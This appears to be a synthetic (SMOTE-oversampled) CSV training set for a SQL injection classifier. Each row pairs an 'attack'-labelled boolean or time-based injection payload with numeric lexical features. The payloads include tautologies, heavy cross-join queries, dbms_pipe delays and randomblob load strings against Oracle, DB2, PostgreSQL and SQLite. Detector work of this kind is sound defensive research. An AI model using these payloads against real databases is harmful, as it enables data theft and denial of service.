id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000176,attack,boolean,"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'yfkk'  =  'yfkk",nearest_attack_euclidean,R000077,1.3842436276183885,139.8178445745611,30.817844574561093,4.15594722318838,75.04461143640273,10.0,35.18215542543891,19.591077712719454,0.5366344372527689,0.07152515711283172,0.25169024947455526,0.14015015615984397,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.5910777127194538,0.0,4.0,0.0,5.0,4.0,2.5910777127194535,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.4089222872805462,0.5910777127194538,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000177,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",nearest_attack_euclidean,R000161,0.254063272733142,131.5971641645004,28.0,3.9757622460024917,71.19905472150015,5.331757869166899,36.0,19.06635157383338,0.541094738976935,0.040374834244185476,0.27363697328669495,0.14489345349218455,3.06635157383338,-1.1102230246251565e-16,0.0,0.0,1.0,1.06635157383338,0.0,4.93364842616662,0.0,5.0,4.0,2.06635157383338,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.06635157383338,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.06635157383338
SMOTE_000178,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  '%'  =  '",nearest_attack_euclidean,R000257,0.5587069416916672,140.0,35.0,3.893547573413456,51.0,10.0,53.0,26.0,0.36428571428571427,0.07142857142857142,0.37857142857142856,0.18571428571428572,2.57299274750868,0.4270072524913199,0.0,0.0,0.0,1.0,0.0,11.0,1.0,2.0,1.0,7.0,0.8576642491695601,0.14233575083044006,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000179,attack,boolean,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000240,0.699369430504043,132.0,34.0,3.7768672070947784,42.0,21.0,53.0,16.0,0.3181818181818182,0.1590909090909091,0.4015151515151515,0.12121212121212122,0.22994843889841166,0.7700515611015882,2.0,0.0,1.0,2.0,0.0,8.0,0.0,1.0,1.0,5.0,0.22994843889841177,0.7700515611015882,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000180,attack,boolean,"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000293,0.032736499662549386,136.01421475981675,36.014214759816745,3.883759782834775,42.0,23.0,54.0,17.014214759816745,0.30879148669427314,0.1691000998563877,0.3970176257497797,0.1250907876995595,2.0,0.014214759816745026,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.014214759816745026,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000181,attack,boolean,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs",nearest_attack_euclidean,R000126,0.08582025563657067,140.03241532665675,32.0,4.147381460645782,77.03241532665676,10.0,34.0,19.0,0.5501034531701812,0.07141215029044744,0.2428013109875213,0.13568308555185013,0.0,3.999999999999999,0.0,0.0,1.0,1.0,0.0,4.0,0.0,5.0,4.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0324153266567548,0.9675846733432449,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000182,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000008,0.7844375656746188,136.31143325312823,32.934299759384686,4.249196108249235,69.0,16.0,37.0,14.311433253128229,0.5061996084979686,0.1173796193618478,0.27144036977427305,0.10498040236591047,0.0,0.3114332531282278,2.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,2.0,5.0,0.0,0.3114332531282279,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000183,attack,boolean,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000172,0.27429256193543533,137.10375683904672,30.0,4.060266159827331,77.10375683904674,8.0,38.0,14.0,0.5623730778770129,0.05835025628306496,0.2771637173445585,0.10211294849536368,1.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.10375683904673805,0.8962431609532617,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000184,attack,boolean,"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000119,0.5443161712339443,132.25067008904117,29.25067008904116,3.8983227441190387,63.0,10.0,40.0,19.25067008904116,0.4763731934603786,0.07561479261275851,0.30245917045103404,0.14555284347582884,0.25067008904116017,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.0,0.0,5.0,4.0,4.0,0.25067008904116034,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000185,attack,boolean,"1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000043,1.4900590474492192,136.45877349982615,34.84707550005795,3.9824115378170837,47.0,21.0,48.305848999884105,20.152924499942053,0.3445901252506177,0.15396580064389304,0.35384726218383633,0.14759681192165283,3.5764622499710272,-1.1102230246251565e-16,0.8470755000579456,0.0,1.0,2.0,0.0,7.576462249971027,0.0,1.0,1.0,7.0,1.0,0.0,0.4235377500289729,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000186,attack,boolean,"1""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000222,0.37442856286703063,135.23387112035766,32.0,4.190560529034505,71.0,9.0,38.05760381744943,17.17626730290824,0.525214097091913,0.06657643484263687,0.28120385731369696,0.12700561075175312,0.0,1.0,2.0,0.0,1.0,1.0,0.0,5.176267302908239,0.0,0.0,3.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000187,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000045,0.4682516374187858,137.94316412877689,29.764208967805782,3.883563853793513,71.0,8.0,41.94316412877687,17.0,0.5147815575325797,0.05800355577831884,0.30395733066017394,0.12325755602892753,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.235791032194219,0.7642089678057815,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000188,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""dqou"" like ""dqou",nearest_attack_euclidean,R000057,0.0470098126769432,136.11607667322895,28.046430669291574,3.99559759898505,84.0,3.023215334645787,35.046430669291574,14.046430669291574,0.6171385877893601,0.022205311613065312,0.2574703737724573,0.10318572682511729,0.0,3.0,0.0,0.0,1.0,0.0,0.0,5.0,0.0,0.0,2.023215334645787,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000189,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000221,0.40564825436156654,134.01627015657002,30.16937835942834,3.9202189085577155,63.0,10.0,40.67751343771335,20.338756718856676,0.4702209650097954,0.07463824841425323,0.3034271910506342,0.1517135955253171,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.169378359428339,0.16937835942833834,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000190,attack,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xdce'  =  'xdce",nearest_attack_euclidean,R000252,0.33979251708757596,132.91189437133855,31.911894371338544,3.638234032210394,42.35242251464582,14.559471856692715,56.08810562866146,19.911894371338544,0.3186701202353427,0.10951989868820078,0.4220011371506616,0.1498088439257949,5.911894371338543,-1.1102230246251565e-16,0.0,1.0,0.0,1.911894371338543,0.0,10.088105628661456,0.0,0.0,1.0,2.9118943713385432,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.08810562866145688,0.0,2.7755575615628914e-17,0.0,1.0,0.911894371338543,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000191,attack,boolean,"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000099,0.27626415519250747,141.76547764630814,30.703567061075596,3.855204809969375,42.0,23.765477646308135,52.0,24.0,0.29626660367870633,0.1676319229979203,0.3668062712212555,0.1692952021021179,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,10.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000192,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000253,0.053916489653162224,131.17782783445844,29.0,3.2284237511339717,34.0,13.0,66.14226226756676,18.03556556689169,0.2592146528952636,0.09911148493054193,0.5041903372842287,0.13748352488996587,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.035565566891691,2.0,0.0,-2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000193,attack,boolean,"1'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000279,1.308515933552994,132.0,27.0,3.840357822173486,62.0,10.0,40.0,20.0,0.4696969696969697,0.07575757575757576,0.30303030303030304,0.15151515151515152,0.5697671829326507,0.43023281706734917,2.0,0.0,1.0,1.0,0.0,6.0,0.0,5.0,4.0,4.0,0.5697671829326507,0.4302328170673492,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000194,attack,boolean,"1 where 9279  =  9279 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000265,0.1591764528629543,141.0,32.56361622583803,3.8748530791672824,41.0,24.0,52.0,24.0,0.2907801418439716,0.1702127659574468,0.36879432624113473,0.1702127659574468,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,10.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000195,attack,boolean,"1'  )   where 8586  =  8586 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000244,1.060679253841666,130.0,34.460401975434756,3.821695023012077,37.0,23.0,52.0,18.0,0.2846153846153846,0.17692307692307693,0.4,0.13846153846153847,2.539598024565241,0.46040197543475897,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.46040197543475897,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000196,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000011,0.4078002669048674,137.65786745455463,29.835533136361338,3.8797884043308732,72.0,8.0,41.65786745455465,16.0,0.5230953845458438,0.058121709393982646,0.30253948727220825,0.11624341878796529,0.8355331363613387,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.164466863638661,0.0,0.0,2.0,4.0,0.8355331363613387,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000197,attack,boolean,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000213,0.08105851948953838,138.12930975176877,30.064654875884383,3.874775752425189,63.4202566932485,10.0,43.773707934404655,20.935345124115617,0.4590655699789171,0.07239778028589061,0.31695662716217676,0.15158002257301545,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.935345124115615,0.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000198,attack,boolean,"1%'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000053,1.5976719541228173,141.0,33.38901672620219,3.408290068040444,34.0,15.0,68.0,24.0,0.24113475177304963,0.10638297872340426,0.48226950354609927,0.1702127659574468,4.443933095191231,1.5560669048087687,0.0,1.0,0.0,2.0,0.0,12.0,2.0,0.0,1.0,3.0,1.0,0.38901672620219213,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000199,attack,boolean,"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""epxq"" like ""epxq",nearest_attack_euclidean,R000249,0.2660844104428729,140.8705144071664,31.741028814332836,4.183055487802677,77.48205762866567,10.0,34.258971185667164,19.129485592833582,0.5500035461946747,0.07098758135401904,0.2432075707870016,0.1358013016643046,0.0,3.999999999999999,0.0,0.0,1.0,1.1294855928335814,0.0,4.0,0.0,5.0,4.0,2.1294855928335816,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000200,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""jwzy""  =  ""jwzy",nearest_attack_euclidean,R000225,1.013203704043518,132.0,33.90192583716928,3.653572887739948,46.0,10.0,57.0,19.0,0.3484848484848485,0.07575757575757576,0.4318181818181818,0.14393939393939395,2.823555622123041,2.176444377876959,0.0,1.0,0.0,1.0,0.0,11.0,0.0,0.0,1.0,2.0,1.0,0.7254814592923197,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
